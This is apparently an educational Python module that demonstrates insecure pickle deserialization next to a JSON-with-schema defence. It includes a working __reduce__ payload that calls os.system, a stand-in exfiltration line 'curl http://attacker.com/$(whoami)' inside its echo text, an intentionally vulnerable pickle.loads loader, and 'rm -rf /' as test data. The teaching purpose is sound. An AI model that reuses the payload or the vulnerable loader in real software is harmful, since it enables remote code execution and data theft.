"""
MITRE ATT&CK T1059.006 - Execution via Deserialization

Insecure deserialization allows attackers to execute arbitrary code by 
manipulating serialized objects. Python's pickle module is particularly 
dangerous as it can execute code during deserialization.

This module demonstrates:
1. VULNERABLE code using pickle deserialization
2. DEFENDED code using JSON with schema validation

Educational purpose: Shows the dangers of deserializing untrusted data.
Reference: https://attack.mitre.org/techniques/T1059/006/
"""

import pickle
import json
import base64
import os
from typing import Any, Dict, Optional
from datetime import datetime


# =============================================================================
# VULNERABLE IMPLEMENTATION - DO NOT USE IN PRODUCTION
# =============================================================================

class VulnerableDataStore:
    """
    ⚠️  VULNERABLE TO T1059.006 (Insecure Deserialization)
    
    This class demonstrates how pickle deserialization can be exploited.
    Pickle can execute arbitrary code during deserialization.
    """
    
    def __init__(self):
        self.data = {}
    
    def save_user_data(self, user_id: str, data: dict) -> str:
        """
        Serialize user data using pickle.
        
        Returns:
            Base64-encoded serialized data
        """
        serialized = pickle.dumps(data)
        encoded = base64.b64encode(serialized).decode('utf-8')
        print(f"[VULNERABLE] Serialized data for user {user_id}")
        return encoded
    
    def load_user_data(self, user_id: str, serialized_data: str) -> dict:
        """
        ⚠️  VULNERABLE: Deserializes user-provided data with pickle.
        
        An attacker can craft malicious pickle data that executes code
        when deserialized.
        
        Args:
            user_id: User identifier
            serialized_data: Base64-encoded pickle data (UNTRUSTED INPUT)
            
        Returns:
            Deserialized data
        """
        print(f"[VULNERABLE] Deserializing data for user {user_id}")
        
        try:
            decoded = base64.b64decode(serialized_data)
            # ⚠️  DANGEROUS: This can execute arbitrary code!
            data = pickle.loads(decoded)
            return data
        except Exception as e:
            print(f"Error deserializing: {e}")
            return {}


class MaliciousPayload:
    """
    Demonstrates how an attacker can craft a malicious pickle payload.
    
    This payload executes code when unpickled, demonstrating T1059.006.
    
    WARNING: This is for educational purposes only!
    """
    
    def __reduce__(self):
        """
        __reduce__ is called during pickling and defines how to reconstruct
        the object. Attackers exploit this to execute arbitrary code.
        
        This example prints a warning message. A real attacker would:
        - Execute shell commands (reverse shell)
        - Read sensitive files
        - Modify system state
        - Install persistence mechanisms
        """
        # Return a callable and its arguments
        # When unpickled, this will execute: os.system(command)
        command = 'echo "MALICIOUS CODE EXECUTED VIA T1059.006 - Attacker could run: curl http://attacker.com/$(whoami)"'
        return (os.system, (command,))


# =============================================================================
# DEFENDED IMPLEMENTATION - SECURE AGAINST T1059.006
# =============================================================================

class SecureDataStore:
    """
    ✅ DEFENDED AGAINST T1059.006 (Insecure Deserialization)
    
    This class uses JSON for serialization, which cannot execute code.
    It also validates data against a schema.
    """
    
    # Define allowed fields and their types
    ALLOWED_FIELDS = {
        'username': str,
        'email': str,
        'age': int,
        'preferences': dict,
        'created_at': str,
        'last_login': str,
        'is_active': bool
    }
    
    def __init__(self):
        self.data = {}
    
    def _validate_schema(self, data: Any) -> tuple[bool, str]:
        """
        Validate that data conforms to expected schema.
        
        Defense against T1059.006: Only allow known, safe data structures.
        """
        if not isinstance(data, dict):
            return False, "Data must be a dictionary"
        
        # Check all fields are allowed
        for key in data.keys():
            if key not in self.ALLOWED_FIELDS:
                return False, f"Unknown field: {key}"
        
        # Check field types
        for key, value in data.items():
            expected_type = self.ALLOWED_FIELDS[key]
            if not isinstance(value, expected_type):
                return False, f"Field {key} must be {expected_type.__name__}, got {type(value).__name__}"
        
        # Additional validation rules
        if 'age' in data and not (0 < data['age'] < 150):
            return False, "Age must be between 1 and 149"
        
        if 'email' in data and '@' not in data['email']:
            return False, "Invalid email format"
        
        return True, "Valid"
    
    def save_user_data(self, user_id: str, data: dict) -> str:
        """
        Serialize user data using JSON.
        
        JSON is safe because it only supports basic data types and cannot
        execute code during deserialization.
        
        Returns:
            JSON string
        """
        # Validate before saving
        is_valid, message = self._validate_schema(data)
        if not is_valid:
            raise ValueError(f"Invalid data: {message}")
        
        serialized = json.dumps(data, indent=2)
        print(f"[DEFENDED] Serialized data for user {user_id} using JSON")
        return serialized
    
    def load_user_data(self, user_id: str, serialized_data: str) -> dict:
        """
        ✅ SECURE: Deserializes JSON data with validation.
        
        Defenses against T1059.006:
        1. Use JSON instead of pickle (cannot execute code)
        2. Validate against schema (only allow expected fields)
        3. Type checking (ensure correct data types)
        
        Args:
            user_id: User identifier
            serialized_data: JSON string (can be from untrusted source)
            
        Returns:
            Deserialized and validated data
        """
        print(f"[DEFENDED] Deserializing data for user {user_id}")
        
        try:
            # JSON deserialization is safe - it only creates basic Python types
            data = json.loads(serialized_data)
            
            # Validate the deserialized data
            is_valid, message = self._validate_schema(data)
            if not is_valid:
                raise ValueError(f"Schema validation failed: {message}")
            
            return data
            
        except json.JSONDecodeError as e:
            print(f"[DEFENDED] Invalid JSON: {e} (T1059.006 defense)")
            return {}
        except ValueError as e:
            print(f"[DEFENDED] Validation error: {e} (T1059.006 defense)")
            return {}


# =============================================================================
# DEMONSTRATION AND TESTING
# =============================================================================

def demo_vulnerable_deserialization():
    """Demonstrate insecure deserialization attack (T1059.006)."""
    print("\n" + "=" * 70)
    print("VULNERABLE CODE DEMONSTRATION (T1059.006)")
    print("=" * 70)
    
    store = VulnerableDataStore()
    
    print("\n1. Normal usage - serialize legitimate data:")
    normal_data = {
        'username': 'alice',
        'email': 'alice@example.com',
        'age': 30
    }
    serialized = store.save_user_data('user123', normal_data)
    print(f"   Serialized: {serialized[:60]}...\n")
    
    print("2. Normal usage - deserialize legitimate data:")
    loaded = store.load_user_data('user123', serialized)
    print(f"   Loaded: {loaded}\n")
    
    print("3. ATTACK - Malicious pickle payload:")
    print("   Attacker creates a malicious object that executes code when unpickled")
    
    # Create malicious payload
    malicious_obj = MaliciousPayload()
    malicious_pickle = pickle.dumps(malicious_obj)
    malicious_encoded = base64.b64encode(malicious_pickle).decode('utf-8')
    
    print(f"   Malicious payload: {malicious_encoded[:60]}...\n")
    print("   ⚠️  Deserializing malicious payload (code will execute):")
    
    # This will execute the malicious code!
    store.load_user_data('attacker', malicious_encoded)
    
    print("\n   ☠️  Code execution achieved via T1059.006!")
    print("   In a real attack, this could:")
    print("   - Execute reverse shell")
    print("   - Steal credentials")
    print("   - Modify system files")
    print("   - Install backdoors")


def demo_defended_deserialization():
    """Demonstrate secure deserialization that blocks T1059.006."""
    print("\n" + "=" * 70)
    print("DEFENDED CODE DEMONSTRATION (T1059.006 Prevention)")
    print("=" * 70)
    
    store = SecureDataStore()
    
    print("\n1. Normal usage - serialize legitimate data:")
    normal_data = {
        'username': 'alice',
        'email': 'alice@example.com',
        'age': 30,
        'is_active': True,
        'created_at': datetime.now().isoformat()
    }
    serialized = store.save_user_data('user123', normal_data)
    print(f"   Serialized (JSON):\n{serialized}\n")
    
    print("2. Normal usage - deserialize legitimate data:")
    loaded = store.load_user_data('user123', serialized)
    print(f"   Loaded: {loaded}\n")
    
    print("3. DEFENSE - Malicious pickle payload is BLOCKED:")
    print("   Attacker tries to inject pickle data...")
    
    # Create malicious payload
    malicious_obj = MaliciousPayload()
    malicious_pickle = pickle.dumps(malicious_obj)
    malicious_encoded = base64.b64encode(malicious_pickle).decode('utf-8')
    
    print(f"   Malicious payload: {malicious_encoded[:60]}...\n")
    print("   Attempting to deserialize as JSON:")
    
    # JSON decoder cannot parse pickle data
    loaded = store.load_user_data('attacker', malicious_encoded)
    print(f"   Result: {loaded}")
    print("   ✅ Attack BLOCKED - pickle data rejected by JSON parser\n")
    
    print("4. DEFENSE - Schema validation blocks unexpected fields:")
    malicious_json = json.dumps({
        'username': 'attacker',
        'email': 'attacker@evil.com',
        'age': 25,
        '__class__': 'MaliciousClass',  # Unexpected field
        'command': 'rm -rf /'  # Unexpected field
    })
    
    print(f"   Malicious JSON with extra fields: {malicious_json}\n")
    loaded = store.load_user_data('attacker', malicious_json)
    print(f"   Result: {loaded}")
    print("   ✅ Attack BLOCKED - unknown fields rejected\n")
    
    print("5. DEFENSE - Type validation:")
    malicious_json = json.dumps({
        'username': 'attacker',
        'email': 'attacker@evil.com',
        'age': 'malicious string instead of int'  # Wrong type
    })
    
    print(f"   JSON with wrong data type: {malicious_json}\n")
    loaded = store.load_user_data('attacker', malicious_json)
    print(f"   Result: {loaded}")
    print("   ✅ Attack BLOCKED - type mismatch detected\n")


def compare_serialization_formats():
    """Compare different serialization formats and their security."""
    print("\n" + "=" * 70)
    print("SERIALIZATION FORMAT COMPARISON")
    print("=" * 70)
    
    data = {'username': 'alice', 'age': 30, 'active': True}
    
    print("\n1. Pickle (DANGEROUS):")
    pickled = pickle.dumps(data)
    print(f"   Size: {len(pickled)} bytes")
    print(f"   Binary: {base64.b64encode(pickled)[:40]}...")
    print("   ⚠️  Can execute arbitrary code during deserialization")
    print("   ⚠️  Cannot be safely used with untrusted data")
    
    print("\n2. JSON (SAFE):")
    json_str = json.dumps(data)
    print(f"   Size: {len(json_str)} bytes")
    print(f"   Text: {json_str}")
    print("   ✅ Cannot execute code")
    print("   ✅ Human-readable")
    print("   ✅ Safe for untrusted data (with validation)")
    
    print("\n3. Security Recommendations:")
    print("   - NEVER use pickle/yaml with untrusted data")
    print("   - Use JSON for data from external sources")
    print("   - Always validate deserialized data against a schema")
    print("   - Consider message signing/encryption for sensitive data")


if __name__ == "__main__":
    print("=" * 70)
    print("MITRE ATT&CK T1059.006 - Insecure Deserialization Demo")
    print("=" * 70)
    print("\nThis demo shows how deserialization can be exploited and how to")
    print("defend against it using safe serialization formats and validation.")
    print("\nWARNING: The vulnerable examples are for educational purposes only!")
    
    # Show vulnerable code
    demo_vulnerable_deserialization()
    
    # Show defended code
    demo_defended_deserialization()
    
    # Compare formats
    compare_serialization_formats()
    
    # Summary
    print("\n" + "=" * 70)
    print("KEY DEFENSES AGAINST T1059.006 (Insecure Deserialization):")
    print("=" * 70)
    print("1. ✅ NEVER deserialize untrusted data with pickle, yaml, or marshal")
    print("2. ✅ Use JSON for data from external/untrusted sources")
    print("3. ✅ Validate all deserialized data against a schema")
    print("4. ✅ Use type checking to ensure correct data types")
    print("5. ✅ Implement allowlists for permitted fields/values")
    print("6. ✅ Consider using digital signatures to verify data integrity")
    print("7. ✅ Run deserialization in sandboxed/isolated environments")
    print("8. ✅ Log and monitor deserialization operations")
    print("=" * 70)
